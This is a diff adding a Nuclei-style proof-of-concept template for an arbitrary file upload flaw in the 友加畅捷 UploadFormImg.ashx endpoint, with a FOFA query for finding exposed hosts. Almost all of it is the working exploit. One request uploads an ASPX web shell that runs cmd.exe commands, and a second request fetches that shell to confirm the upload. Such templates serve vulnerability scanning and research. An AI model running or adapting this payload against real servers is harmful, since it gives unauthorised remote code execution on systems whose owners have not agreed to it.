@@ -1,0 +1,83 @@
+id: poc-csvq8uk97hlk0lxm
+info:
+  name: 友加畅捷 UploadFormImg存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/csvq8uk97hlk0lxm'
+  tags: file-upload,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: csvq8uk97hlk0lxm
+    fofa: icon_hash="2049187099"
+http:
+- raw:
+  - 'GET /Report/Upload/UploadFormImg.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+
+    Accept-Encoding: gzip, deflate, br
+
+    Connection: keep-alive
+
+    Cookie: ASP.NET_SessionId=jbrnojca2wzaxlwu0depa115; toLogin=0
+
+    Upgrade-Insecure-Requests: 1
+
+    Priority: u=0, i
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+
+    Content-Length: 3770
+
+
+    ------WebKitFormBoundary7MA4YWxkTrZu0gW
+
+    Content-Disposition: form-data; name="Op"
+
+
+    UploadImgFile
+
+    ------WebKitFormBoundary7MA4YWxkTrZu0gW
+
+    Content-Disposition: form-data; name="Type"
+
+
+    image
+
+    ------WebKitFormBoundary7MA4YWxkTrZu0gW
+
+    Content-Disposition: form-data; name="NameRule"
+
+
+    1
+
+    ------WebKitFormBoundary7MA4YWxkTrZu0gW
+
+    Content-Disposition: form-data; name="file"; filename="test1.aspx"
+
+    Content-Type: image/jpeg
+
+
+    <%@ Page Language="C#" %><script runat="server">protected void Page_Load(object sender,EventArgs e){System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c netstat -ano";p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.StartInfo.CreateNoWindow=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());p.WaitForExit();}</script>
+
+    ------WebKitFormBoundary7MA4YWxkTrZu0gW--![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1790606666084-0554758e-809a-4d2e-9e54-e0f3f0e2fdac.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /Report/UploadFile/test1.aspx HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
